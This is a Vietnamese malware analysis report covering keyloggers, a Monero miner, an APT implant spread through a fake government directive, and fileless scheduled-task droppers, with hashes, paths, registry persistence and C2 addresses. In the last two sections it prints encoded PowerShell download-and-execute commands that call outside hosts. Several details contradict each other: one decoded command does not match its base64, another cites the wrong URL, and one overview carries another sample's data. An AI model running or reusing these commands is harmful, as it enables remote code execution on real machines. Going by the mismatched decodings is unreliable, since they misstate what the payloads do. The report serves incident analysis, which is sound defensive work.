1.K.exe
```
Thông tin cơ bản của tiến trình K.exe
Tên tiến trình	K.exe
Path	C:\Users\admin\K.exe
Hash MD5	9C8E18A1E2672333D686A515E3F5AA41
Hash SHA-1	88F0E3C4E61F2C394B61ED8CC383B339C1D79AC2
Kích thước	104 KB
```
1.	Tổng quát

```
Tên : K.exe
Kích thước : 104 KB
Vị trí : C:\Users\admin\K.exe
Phân loại : keylogger 	
```

2.	Chi tiết

  Lần đầu phát hiện tiến trình ```K.exe``` :

  ![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/8fdb4ae8-6629-4cc0-9e6f-f46a7807a6ac)

 
Check trên virustotal :

 ![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/6f096f58-3450-4e30-a724-d2cad69a3084)



Check trên task manager thấy ```K.exe``` chiếm 50% CPU :

![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/139a3626-7569-4bf4-9353-567a6937d246)


Tiến trình ```K.exe``` liên tục mở ,viết, lấy thông tin ```QueryStandardInformationFile```, và đóng 1 file tên TxtLog nằm trong thư mục ```C:\ProgramData\NTlog\```:


 ![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/814428e0-f68e-4638-be6f-2b2b9e20144f)
 

Nội dung file ```TxtLog``` là những tiến trình được thực thi theo thời gian :
 
![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/27919482-e86a-47b4-9643-31f2cc8ea60d)



Một số hàm mà ```K.exe``` sử dụng : các hàm sau liên quan đến việc mở và chỉnh sửa nội dung vào file :

![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/5fa815e9-2157-4056-9589-746e902a59f8)
 

Sau đây là 1 số hàm cũng có thể được sử dụng cho keylogger:

 ![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/afb52bc7-b9e4-4d43-89c0-238c344502ce)

+ GetConsoleMode: Hàm này có thể được sử dụng để theo dõi hoạt động nhập từ bàn phím
+ GetModuleFileNameExW: Hàm này có thể được sử dụng để lấy đường dẫn tệp thực thi của một tiến trình khác
+ GetModuleHandleExW: Hàm này có thể được sử dụng để lấy handle của một module của tiến trình khác
+ GetForegroundWindow: được sử dụng để lấy handle của cửa sổ (window) đang hoạt động trong lúc đó, tức là cửa sổ đang được người dùng tương tác trực tiếp

Tiến trình ```K.exe``` sử dụng 1 value ```UpdateWeekly``` ở trong registry HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run để tạo persistance 				
 
 
![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/95dbf17a-4db6-4264-92aa-bf59611ff698)

![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/e926ee95-8a27-4fcb-aee1-2d9ba8304527)


2. NsCpu.exe	

Thông tin tiến trình :
Tên tiến trình	NsCpu.exe
Path	C:\temp001\ NsCpu.exe
Hash MD5	F594A17D37C70B0D18F33A3882E891A0
Hash SHA-1	E0A4E05A71804D90759F8594CF3DCAD7E1D6A8A0
Kích thước	4.66 MB

1.	Tổng quát
Tên : IconOverlayEx.dll
Kích thước : 1.78 MB
Vị trí : C:\Users\admin\AppData\Local
Phân loại : đào coin

2.	Chi tiết
Phát hiện tiến trình lạ tên NsCpu.exe :

 ![image](https://github.com/trishuy/Malware-Analysis-and-Reverse-Engineering/assets/95763623/97c0412c-74d5-4ee5-b046-cb1e18995f9f)


Kiểm tra trên viustotal: 
 

Kiểm tra thông tin thì đây là 1 lại mã độc dùng để đào coin , nhưng khi kiểm tra thì không thấy tiến trình này sử dụng nhiều tài nguyên hệ thống : 
 


Trong thư mục chứa file NsCpu.exe có bào gồm thêm 2 file nữa temp.vbs và msvcr110.dll:

  
File temp.vbs này có vai trò kiểm tra xem NsCpu.exe có tồn tại không , nếu có thì khởi chạy NsCpu.exe thông qua Windows Script Host (WScript.Shell): 

 





Tiến trình NsCpu.exe có hành vi liên tục tạo và thoát:
 

Sau khi kết thúc tiến trình này hoàn toàn và chạy lại , nguyên do cho việc tiến trình được tạo và kết thúc liên tục là do máy tính này không kết nối mạng ra ngoài , cho nên tiến trình này không thể kết nối đến  máy chủ mine.xmrpool.net với port 3333,cho nên nó phải liên tục khởi động lại:
 




Nếu kết nối mạng thì tiến trình này có thể kết nối đến mine.xmrpool.net với IP 139.99.124.170

 
 

Tiến trình NsCpu.exe tạo persistance thông qua value “NsCpu” nằm trong registry key “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” bằng cách chạy “temp.vbs” nằm trong  cùng thư mục với tiến trình này : “C:\temp001\”

 


3. unsecapp.exe

Thông tin các tệp : 

Tên tiến trình	unsecapp.exe
Path	C:\Users\admin\Microsoft Malware ProtectionpiQ
Hash MD5	28c6f235946fd694d2634c7a2f24c1ba
Hash SHA-1	e9a9ce1ff07834d6ba9a51ba0d9e7c7a0b68d3e5
Loại tệp	PE
Tên tiến tệp	http_dll.dat

1.	Tổng quát
Tên : unsecapp.exe
Kích thước : 1.78 MB
Vị trí : C:\Users\admin\Microsoft Malware ProtectionpiQ

2.	Chi tiết 
 
unsecapp.exe nằm trong cùng thư mục với 2 tệp khác :  http_dll.dll, http_dll.dat

Tên tiến trình	http_dll.dll
Path	C:\Users\admin\Microsoft Malware ProtectionpiQ
Hash MD5	63CBFC445B6B616F7A983B68324C55C3
Hash SHA-1	7E747840C7791A196B420CA819FA2CC842E6F145
Loại tệp	.DLL

 

Tên tiến tệp	http_dll.dat
Path	C:\Users\admin\Microsoft Malware ProtectionpiQ
Hash MD5	1C20EF0DBE80C7A3190DCB7511301CD7
Hash SHA-1	00E7280994393B0B0C656104976345E4A826B056
Loại tệp	.DAT

 



3 tệp trên nằm trong cùng 1 thư mục “C:\Users\admin\Microsoft Malware ProtectionpiQ” , cả 3 là 1 phần của cuộc tấn công APT. Cuộc tấn công này có IOC thông qua cuộc tấn công giả mạo “Chỉ thị của thủ tướng Nguyễn Xuân Phúc” thông qua phát tán 1 file “Chi Thi cua thu tuong nguyen xuan phuc.rar”

 
 

Theo IOC , file “Chi Thi cua thu tuong nguyen xuan phuc.rar” sẽ tạo ra các file 3.exe, http_dll.dll, http_dll.dat, Chi Thi cua thu tuong nguyen xuan phuc.doc trong “%LocalAppData%\Temp”. Sau đó 3.exe, tiến trình này sẽ tạo các file unsecapp.exe , http_dll.dll, http_dll.dat trong thư mục “%AllUsersProfile%\Microsoft Malware Protectionydy”. Điều này giống như những gì đã đươc phát hiện : 3 file unsecapp.exe , http_dll.dll, http_dll.dat nằm trong C:\Users\admin\Microsoft Malware ProtectionpiQ.sau đó file unsecapp.exe sẽ được thực thi và kết nối với 1 máy chủ c2 ra ngoài , trong máy file unsecapp.exe cx có kết nối ra ngoài đén 1 máy chủ có ip 104.225.155.153:

 

unsecapp.exe được tạo persistance trong 2 registry key :

HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run	
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

 


	4.C.exe

Tên tiến trình	C.exe
Path	C:\Windows\Ulti\
Hash MD5	63EAC41109314A71897613054B5249F6
Hash SHA-1	06044D9BDA7ED45B70C2EFBEA80A10E03F9624AD
Loại tệp	98.0 KB

1.	Tổng quát 

Tên : C.exe
Kích thước : 98.0 KB
Vị trí : C:\Windows\Ulti\
Phân loại : keylogger 	





2.	Chi tiết 

Check trên virustotal :

 

Kiểm tra hoạt động của tiến trình C.exe thấy tiến trình này liên tục tạo ra và ghi vào 2 file “ImgLog” và “Ntlog” trong thư mục C:\ProgramData\ :
 

File ImgLog sẽ chụp màn hình mỗi 20s :  


File Ntlog ghi lại hành vi của người dụng mỗi 20s:
 

Tiến trình tạo persistance qua value “Update” trong key : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run     thông qua việc chạy lệnh “"C:\Windows\system32\pow.exe" "C:\Windows\Ulti\C.exe"” 
 





5.U.exe

Tên tiến trình	U.exe
Path	C:\Windows\Ulti\
Hash MD5	7e95f8b5dff13c6e11f24133306a59f3
Hash SHA-1	c2b4e26c24e75cb840c214bd673727b94d5811ba
Loại tệp	PE

Kiểm tra virus total :

 

File U.exe này được tìm thấy cùng với file C.exe trong cùng thư mục C:\Windows\Ulti\  
 

Không ghi nhận bất cú hành vi nào của U.exe trên máy kể cả khi đã cố khởi chạy tiến trình này .

6. vihvhgvj.exe

Tên tiến trình	vihvhgvj.exe
Path	C:\Users\admin\AppData\Roaming\macaddress
Hash MD5	ad4dcd0935d159515de56dbb9bb42402
Hash SHA-1	c4a309ad63dddd4c3a94cd6da13629a0a0d5d9b0
Loại tệp	PE

Kiểm tra trên virustotal :

 


vihvhgvj.exe sử dụng nhiều value có tên khác nhau trong cùng 1 key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run để tạo persistance :

 


Ngoài ra không thấy tiến trình vihvhgvj.exe có bất kỳ hành vi nào.

7. macaddress.exe

Tên tiến trình	macaddress.exe
Path	C:\Users\admin\AppData\Roaming\macaddress
Hash MD5	9234bec50f3cfd3e3735b4a6b72d46af
Hash SHA-1	711c6e105d9a498e61684bebd4678ea2abbffb4e
Loại tệp	PE

Kiểm tra trên virustotal :

 



Tiến trình này bị hủy ngay khi máy vừa khởi động : 

 

Kiểm tra trong log thấy file này bị hủy do C:\Windows\syswow64\KERNELBASE.dll bị lỗi :

 

Do tiến trình này không thể chạy được nên không biết được hành vi .



Tiến trình macaddress.exe tạo persistance qua value macaddress trong khóa  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :

 
8. CpuZ.exe

Tên tiến trình	CpuZ.exe
Path	C:\CpuZ\CpuZ
Hash MD5	eabd3cfdce52cd4ed776978c8e15e1dd
Hash SHA-1	ea6c0e59bfb98ba2648baa8f3077600a18509ea2
Loại tệp	PE


Kiểm tra trên virustotal :

 
9. log.dll

Tên tiến trình	log.dll
Path	C:\Users\admin\AppData\Local\Temp\8d834390a426

C:\Program Files (x86)\BitDefender Update Handlers
Hash MD5	e5fcf4118802e36ef6c6d5836b0460ee
Hash SHA-1	c4c279d86ae5e586322cb4dd68d6d3239141a538
Loại tệp	DLL


 



 


10. LBTServ.dll

Tên tiến trình	LBTServ.dll
Path	C:\Users\admin\Downloads\Logitech Union Bluetooth
Hash MD5	5767a17038ca8003ee3e806c5c64b2da
Hash SHA-1	632fcde8e3ea9af2a0270af5e6b72e298e356095
Loại tệp	DLL


 



11. Adobe_Caps.dll

Tên tiến trình	Adobe_Caps.dll
Path	C:\ProgramData\AdobePhotosufR
Hash MD5	8217ab42887bf513464d714eb0a40c02
Hash SHA-1	69e05e93edbc2f0b258fb8ed0a4af15129940dbc
Loại tệp	DLL


 

12. IconOverlayEx.dll

Tên tiến trình	IconOverlayEx.dll
Path	C:\Users\admin\AppData\Local
Hash MD5	8643347d7b85ee53095a49828716507d
Hash SHA-1	f7d9a733adbbcd5323b51e3a147f9fe402db66e0
Kích thước	1.78 MB

1.	Tổng quan
Tên : IconOverlayEx.dll
Kích thước : 1.78 MB
Vị trí : C:\Users\admin\AppData\Local

2.	Chi tiết 
- Kiểm tra trên virustotal :
 


- Persistence :Tệp này tạo persistance thông qua khóa HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders . khóa này tạo ra các startup folder giúp các tệp trong đấy được thực thi khi máy được chạy , trong đó \Appdata\local là thư mục chứa tệp IconOverlayEx.dll

 







13. Sync

Tên tiến trình	Không có
Path	Không có
Hash MD5	Không có
Hash SHA-1	Không có
Loại tệp	Không có

1.	Tổng quan 
Tên : Sync
Kích thước : không có
Vị trí : không có
Phân loại : virus fileless
Hành vi : thực thi 1 file có nội dung được tải từ xa qua tác vụ lập lịch

2.	Chi tiết 
- Hành vi : tiến trình này được thực hiện thông qua việc chạy tạo 1 tác vụ lập lịch. Đến 1 thời điểm 1 lệnh sẽ được thực thi :
"powershell" -nop -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AHMAbQBiACcAKQA==

Lệnh này đã được mã hóa bằng base64 , sau khi decode thì sẽ được : 

“Start-Process -NoNewWindow Note.exe -ArgumentList 'http://cdn.chatecndne.net/p?h=1/2/2021 12:55:44 AM' -WindowStyle Hidden”

Trong đó : 
+ Start-Process: Lệnh cmdlet này được sử dụng để bắt đầu một tiến trình mới.
+ NoNewWindow: Tham số này ngăn quá trình mới mở trong một cửa sổ mới.
+ Note.exe: Đây là tập tin thực thi đang được khởi động.
+ ArgumentList: Tham số này chỉ định danh sách các đối số sẽ được chuyển đến tệp thực thi. Đối số đang được chuyển là URL 'http://cdn.chatecndne.net/p?h=1/2/2021 12:55:44 AM'.
+ WindowStyle Hidden: Tham số này chỉ định rằng cửa sổ của quá trình đã bắt đầu sẽ bị ẩn khỏi chế độ xem.

- Persistence :Tiến trình này được lập lịch để chạy lúc 7:00 AM ngày 24/5/2019 và sẽ lặp lại mỗi 40 phút 

 

14. Winnet

Tên tiến trình	Không có
Path	Không có
Hash MD5	Không có
Hash SHA-1	Không có
Loại tệp	Không có

1.	Tổng quan 
Tên : Sync
Kích thước : không có
Vị trí : không có
Phân loại : virus fileless
Hành vi : thông qua lập lịch tải xuống 1 tệp và thực thi tệp đó

2.	Chi tiết 
- Hành vi : tiến trình này được thực hiện thông qua việc chạy tạo 1 tác vụ lập lịch. Đến 1 thời điểm 1 lệnh sẽ được thực thi :
"powershell" -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALgBjAGgAYQB0AGMAZABuAC4AbgBlAHQALwBwAD8AaABpAGcAMQA5ADAANQAyADQAJwApAA==
Lệnh này đã được mã hóa bằng base64 , sau khi decode thì sẽ được : 

"powershell" -nop -ep bypass -e  IEX (New-Object Net.WebClient).downloadstring('http://cdn.chatcdn.net/p?hig190524')

Trong đó : 
+ nop: Tham số này là viết tắt của "NoProfile" và ngăn tải các tập lệnh cấu hình PowerShell, có thể tăng tốc quá trình khởi động.
+ ep bypass: Tham số này là viết tắt của "ExecutionPolicy" và đặt chính sách thực thi thành "Bypass", cho phép chạy tập lệnh mà không có bất kỳ hạn chế nào.
+ e: Tham số này chỉ định rằng chuỗi tiếp theo là một lệnh được mã hóa sẽ được thực thi.
+ iex: Đây là cách gọi khác cho cmdlet Invoke-Expression, được sử dụng để thực thi một chuỗi dưới dạng mã PowerShell.
+ (New-Object Net.WebClient).DownloadString('http://p.estonine.com/p/?smb'): Phần này của lệnh sử dụng đối tượng .NET WebClient để tải xuống nội dung từ URL đã chỉ định.

-> Mục đích của lệnh được giải mã này là tải xuống nội dung từ URL 'http://p.estonine.com/p/?smb' và thực thi nội dung đó bằng cmdlet Invoke-Expression (iex).

- Persistence :Tiến trình này được lập lịch để chạy lúc 10:30 AM ngày 24/5/2019 và sẽ lặp lại mỗi 45 phút 
 


15.
